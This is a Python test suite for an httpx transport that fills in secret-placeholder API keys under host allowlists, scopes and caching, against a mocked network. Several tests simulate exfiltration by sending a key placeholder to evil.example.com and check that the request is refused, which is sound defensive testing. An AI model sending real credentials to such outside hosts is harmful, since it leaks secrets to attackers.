"""The httpx transports: substitution, allowlist, scope, and caching.

Exercised through a real ``httpx.Client``, with ``httpx.MockTransport`` standing
in for the network, so what is asserted is what a provider SDK would actually
put on the wire.

Skipped when the ``httpx`` extra is not installed (``pip install
'seekrit[httpx]'``); runnable with either ``pytest`` or ``python -m unittest``.
"""

import asyncio
import unittest

try:
    import httpx

    from seekrit._policy import AllowRule
    from seekrit._scope import Scope, use_scope
    from seekrit.errors import SeekritError, SeekritSubstitutionError
    from seekrit.transport import AsyncSeekritTransport, SeekritTransport

    HAVE_HTTPX = True
except ImportError:  # pragma: no cover - depends on the install
    HAVE_HTTPX = False

KEYS = {"OPENAI_API_KEY": "sk-live-abc", "STRIPE_SECRET_KEY": "sk_test_stripe"}


class FakeClient:
    """Stands in for ``seekrit.Client``; counts resolves so caching is observable."""

    def __init__(self, values=None):
        self.values = dict(values if values is not None else KEYS)
        self.calls = 0

    def resolve(self):
        self.calls += 1
        return dict(self.values)


def recorder():
    """A mock upstream that records the request it was handed."""
    seen = {}

    def handler(request):
        seen["url"] = str(request.url)
        seen["method"] = request.method
        seen["headers"] = dict(request.headers)
        seen["body"] = request.content.decode() if request.content else ""
        return httpx.Response(200, json={"ok": True})

    return seen, httpx.MockTransport(handler)


@unittest.skipUnless(HAVE_HTTPX, "httpx extra not installed")
class SubstitutionTests(unittest.TestCase):
    def _client(self, *, seen_transport=None, **kwargs):
        seen, mock = seen_transport or recorder()
        kwargs.setdefault("client", FakeClient())
        transport = SeekritTransport(transport=mock, **kwargs)
        return seen, httpx.Client(transport=transport)

    def test_substitutes_a_header(self):
        injected = []
        seen, client = self._client(
            allow={"api.openai.com": ["OPENAI_API_KEY"]}, on_inject=injected.append
        )
        response = client.post(
            "https://api.openai.com/v1/chat/completions",
            headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
            json={"model": "x"},
        )
        self.assertEqual(response.status_code, 200)
        self.assertEqual(seen["headers"]["authorization"], "Bearer sk-live-abc")
        self.assertEqual(
            injected,
            [
                {
                    "host": "api.openai.com",
                    "method": "POST",
                    "path": "/v1/chat/completions",
                    "names": ["OPENAI_API_KEY"],
                    "label": "",
                }
            ],
        )

    def test_a_request_without_a_placeholder_does_not_resolve(self):
        resolver = FakeClient()
        seen, client = self._client(
            allow={"api.openai.com": ["OPENAI_API_KEY"]}, client=resolver
        )
        client.get("https://api.openai.com/v1/models", headers={"authorization": "Bearer plain"})
        self.assertEqual(seen["headers"]["authorization"], "Bearer plain")
        self.assertEqual(resolver.calls, 0)

    def test_substitutes_the_body_and_recomputes_content_length(self):
        seen, client = self._client(allow={"hooks.slack.com": ["OPENAI_API_KEY"]})
        client.post(
            "https://hooks.slack.com/services/x",
            content='{"k":"{{seekrit:OPENAI_API_KEY}}"}',
        )
        self.assertEqual(seen["body"], '{"k":"sk-live-abc"}')
        self.assertEqual(seen["headers"]["content-length"], str(len(seen["body"])))

    def test_substitutes_the_query_string(self):
        seen, client = self._client(allow={"api.example.com": ["OPENAI_API_KEY"]})
        client.get("https://api.example.com/v1/x?key={{seekrit:OPENAI_API_KEY}}")
        self.assertEqual(seen["url"], "https://api.example.com/v1/x?key=sk-live-abc")

    def test_body_scanning_can_be_turned_off(self):
        seen, client = self._client(allow={"hooks.slack.com": ["OPENAI_API_KEY"]}, body=False)
        client.post(
            "https://hooks.slack.com/services/x",
            headers={"x-k": "{{seekrit:OPENAI_API_KEY}}"},
            content='{"k":"{{seekrit:OPENAI_API_KEY}}"}',
        )
        self.assertEqual(seen["headers"]["x-k"], "sk-live-abc")
        self.assertEqual(seen["body"], '{"k":"{{seekrit:OPENAI_API_KEY}}"}')


@unittest.skipUnless(HAVE_HTTPX, "httpx extra not installed")
class RefusalTests(unittest.TestCase):
    """A refusal answers 403 rather than raising, by default.

    A provider SDK wraps anything its HTTP layer raises into its own opaque
    connection error *and retries it*, so raising would turn "the Stripe key is
    not allowed toward api.openai.com" into "Connection error" after six
    attempts. 403 is terminal in every provider SDK, and it is exactly what the
    proxy answers.
    """

    def _client(self, **kwargs):
        _, mock = recorder()
        kwargs.setdefault("client", FakeClient())
        return httpx.Client(transport=SeekritTransport(transport=mock, **kwargs))

    def _assert_refused(self, response, code, secret_name):
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.headers["x-seekrit-refusal"], code)
        self.assertEqual(response.headers["x-seekrit-secret"], secret_name)
        if secret_name:
            self.assertIn("{{seekrit:" + secret_name + "}}", response.text)
        for value in KEYS.values():
            self.assertNotIn(value, response.text)

    def test_a_name_outside_this_hosts_allowlist_is_refused_with_a_403(self):
        seen, mock = recorder()
        client = httpx.Client(
            transport=SeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=FakeClient(),
                transport=mock,
            )
        )
        response = client.post(
            "https://api.openai.com/v1/chat/completions",
            headers={"authorization": "Bearer {{seekrit:STRIPE_SECRET_KEY}}"},
        )
        self._assert_refused(response, "denied", "STRIPE_SECRET_KEY")
        self.assertEqual(seen, {}, "the request must never reach the upstream")

    def test_refusal_raise_gives_the_typed_error_instead(self):
        refused = []
        client = self._client(
            allow={"api.openai.com": ["OPENAI_API_KEY"]},
            refusal="raise",
            on_refuse=refused.append,
        )
        with self.assertRaises(SeekritSubstitutionError) as caught:
            client.post(
                "https://api.openai.com/v1/chat/completions",
                headers={"authorization": "Bearer {{seekrit:STRIPE_SECRET_KEY}}"},
            )
        self.assertEqual(caught.exception.code, "denied")
        self.assertEqual(caught.exception.secret_name, "STRIPE_SECRET_KEY")
        self.assertNotIn("sk_test_stripe", str(caught.exception))
        self.assertEqual(len(refused), 1, "on_refuse fires in both modes")

    def test_the_same_name_toward_an_unlisted_host_is_denied(self):
        client = self._client(allow={"api.openai.com": ["OPENAI_API_KEY"]})
        response = client.post(
            "https://evil.example.com/v1/x",
            headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
        )
        self._assert_refused(response, "denied", "OPENAI_API_KEY")

    def test_an_allowed_name_that_did_not_resolve_is_refused(self):
        client = self._client(allow={"api.openai.com": ["ABSENT_KEY"]})
        response = client.get(
            "https://api.openai.com/v1/x", headers={"x-k": "{{seekrit:ABSENT_KEY}}"}
        )
        self._assert_refused(response, "unresolved", "ABSENT_KEY")

    def test_method_and_path_constraints_are_enforced(self):
        rules = [
            AllowRule(
                host="api.openai.com",
                methods=("POST",),
                paths=("/v1/chat/completions",),
                allow=("OPENAI_API_KEY",),
            )
        ]
        client = self._client(rules=rules)
        headers = {"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"}
        self.assertEqual(
            client.post("https://api.openai.com/v1/chat/completions", headers=headers).status_code,
            200,
        )
        self._assert_refused(
            client.get("https://api.openai.com/v1/chat/completions", headers=headers),
            "denied",
            "OPENAI_API_KEY",
        )
        self._assert_refused(
            client.post("https://api.openai.com/v1/embeddings", headers=headers),
            "denied",
            "OPENAI_API_KEY",
        )

    def test_an_empty_allowlist_is_a_configuration_error(self):
        with self.assertRaises(SeekritError):
            SeekritTransport(client=FakeClient())

    def test_an_unknown_refusal_mode_is_a_configuration_error(self):
        with self.assertRaises(SeekritError):
            SeekritTransport(allow={"a.example": ["K"]}, client=FakeClient(), refusal="explode")

    def test_a_resolve_failure_still_raises(self):
        class Broken:
            def resolve(self):
                raise SeekritError("api unreachable")

        client = self._client(allow={"api.openai.com": ["OPENAI_API_KEY"]}, client=Broken())
        with self.assertRaises(SeekritError):
            client.get(
                "https://api.openai.com/v1/x",
                headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
            )


@unittest.skipUnless(HAVE_HTTPX, "httpx extra not installed")
class ScopeTests(unittest.TestCase):
    def test_a_scope_narrows_but_cannot_widen(self):
        seen, mock = recorder()
        client = httpx.Client(
            transport=SeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY", "STRIPE_SECRET_KEY"]},
                client=FakeClient(),
                transport=mock,
            )
        )
        with use_scope(Scope(allow=("OPENAI_API_KEY",), label="tool:chat")):
            client.get(
                "https://api.openai.com/v1/x",
                headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
            )
            self.assertEqual(seen["headers"]["authorization"], "Bearer sk-live-abc")
            narrowed = client.get(
                "https://api.openai.com/v1/x",
                headers={"x-s": "{{seekrit:STRIPE_SECRET_KEY}}"},
            )
            self.assertEqual(narrowed.status_code, 403)
            self.assertEqual(narrowed.headers["x-seekrit-secret"], "STRIPE_SECRET_KEY")
        # A scope naming something the static rules never permitted stays denied.
        with use_scope(Scope(allow=("SOMETHING_ELSE",))):
            self.assertEqual(
                client.get(
                    "https://api.openai.com/v1/x",
                    headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
                ).status_code,
                403,
            )

    def test_require_scope_fails_closed_when_the_context_is_lost(self):
        _, mock = recorder()
        client = httpx.Client(
            transport=SeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=FakeClient(),
                transport=mock,
                require_scope=True,
            )
        )
        refused = client.get(
            "https://api.openai.com/v1/x",
            headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
        )
        self.assertEqual(refused.status_code, 403)
        self.assertEqual(refused.headers["x-seekrit-refusal"], "scope_required")
        with use_scope(Scope(label="tool:x")):
            client.get(
                "https://api.openai.com/v1/x",
                headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
            )

    def test_the_scope_label_reaches_the_inject_hook(self):
        injected = []
        _, mock = recorder()
        client = httpx.Client(
            transport=SeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=FakeClient(),
                transport=mock,
                on_inject=injected.append,
            )
        )
        with use_scope(Scope(label="tool:refund")):
            client.get(
                "https://api.openai.com/v1/x",
                headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
            )
        self.assertEqual(injected[0]["label"], "tool:refund")

    def test_each_scope_gets_its_own_resolve(self):
        _, mock = recorder()
        resolver = FakeClient()
        client = httpx.Client(
            transport=SeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=resolver,
                transport=mock,
            )
        )
        headers = {"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"}
        # A scope with overrides cannot reuse the unscoped client, so this would
        # construct a real Client — assert the *cache key* differs instead.
        self.assertEqual(Scope(overrides={"tenants": "a"}).key(), Scope(overrides={"tenants": "a"}).key())
        self.assertNotEqual(
            Scope(overrides={"tenants": "a"}).key(), Scope(overrides={"tenants": "b"}).key()
        )
        client.get("https://api.openai.com/v1/x", headers=headers)
        self.assertEqual(resolver.calls, 1)


@unittest.skipUnless(HAVE_HTTPX, "httpx extra not installed")
class ClientSourceTests(unittest.TestCase):
    """Where values come from, when a scope re-scopes the resolve."""

    def _client(self, **kwargs):
        seen, mock = recorder()
        return seen, httpx.Client(transport=SeekritTransport(transport=mock, **kwargs))

    def test_a_callable_client_is_given_the_overrides(self):
        asked = []

        def factory(overrides):
            asked.append(overrides)
            tenant = (overrides or {}).get("tenants", "none")
            return FakeClient({"OPENAI_API_KEY": f"sk-{tenant}"})

        seen, client = self._client(
            allow={"api.openai.com": ["OPENAI_API_KEY"]}, client=factory
        )
        headers = {"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"}
        with use_scope(Scope(overrides={"tenants": "northwind"})):
            client.get("https://api.openai.com/v1/x", headers=headers)
        self.assertEqual(seen["headers"]["authorization"], "Bearer sk-northwind")

        with use_scope(Scope(overrides={"tenants": "lumen"})):
            client.get("https://api.openai.com/v1/x", headers=headers)
        self.assertEqual(seen["headers"]["authorization"], "Bearer sk-lumen")
        self.assertEqual(asked, [{"tenants": "northwind"}, {"tenants": "lumen"}])

    def test_a_single_client_cannot_serve_a_re_scoped_request(self):
        # Silently using it would resolve the wrong tenant, and falling through
        # to $SEEKRIT_TOKEN would fail three frames down with "no service token".
        _, client = self._client(
            allow={"api.openai.com": ["OPENAI_API_KEY"]}, client=FakeClient()
        )
        with use_scope(Scope(overrides={"tenants": "northwind"})):
            with self.assertRaises(SeekritError) as caught:
                client.get(
                    "https://api.openai.com/v1/x",
                    headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
                )
        self.assertIn("cannot reuse a single client", str(caught.exception))

    def test_a_single_client_still_serves_an_unscoped_request(self):
        seen, client = self._client(
            allow={"api.openai.com": ["OPENAI_API_KEY"]}, client=FakeClient()
        )
        client.get(
            "https://api.openai.com/v1/x",
            headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
        )
        self.assertEqual(seen["headers"]["authorization"], "Bearer sk-live-abc")


@unittest.skipUnless(HAVE_HTTPX, "httpx extra not installed")
class CachingTests(unittest.TestCase):
    def _client(self, resolver, ttl):
        _, mock = recorder()
        return httpx.Client(
            transport=SeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=resolver,
                transport=mock,
                ttl_seconds=ttl,
            )
        )

    def test_resolves_once_within_the_ttl(self):
        resolver = FakeClient()
        client = self._client(resolver, 60)
        for _ in range(3):
            client.get(
                "https://api.openai.com/v1/x",
                headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
            )
        self.assertEqual(resolver.calls, 1)

    def test_ttl_zero_resolves_every_time(self):
        resolver = FakeClient()
        client = self._client(resolver, 0)
        for _ in range(3):
            client.get(
                "https://api.openai.com/v1/x",
                headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
            )
        self.assertEqual(resolver.calls, 3)


@unittest.skipUnless(HAVE_HTTPX, "httpx extra not installed")
class AsyncTransportTests(unittest.TestCase):
    def test_substitutes_on_the_async_path(self):
        seen, mock = recorder()

        async def run():
            transport = AsyncSeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=FakeClient(),
                transport=mock,
            )
            async with httpx.AsyncClient(transport=transport) as client:
                await client.post(
                    "https://api.openai.com/v1/chat/completions",
                    headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
                    json={"model": "x"},
                )

        asyncio.run(run())
        self.assertEqual(seen["headers"]["authorization"], "Bearer sk-live-abc")

    def test_denies_on_the_async_path(self):
        _, mock = recorder()

        async def run():
            transport = AsyncSeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=FakeClient(),
                transport=mock,
            )
            async with httpx.AsyncClient(transport=transport) as client:
                return await client.post(
                    "https://evil.example.com/x",
                    headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
                )

        response = asyncio.run(run())
        self.assertEqual(response.status_code, 403)
        self.assertEqual(response.headers["x-seekrit-refusal"], "denied")

    def test_raises_on_the_async_path_when_asked(self):
        _, mock = recorder()

        async def run():
            transport = AsyncSeekritTransport(
                allow={"api.openai.com": ["OPENAI_API_KEY"]},
                client=FakeClient(),
                transport=mock,
                refusal="raise",
            )
            async with httpx.AsyncClient(transport=transport) as client:
                await client.post(
                    "https://evil.example.com/x",
                    headers={"authorization": "Bearer {{seekrit:OPENAI_API_KEY}}"},
                )

        with self.assertRaises(SeekritSubstitutionError):
            asyncio.run(run())


if __name__ == "__main__":
    unittest.main()
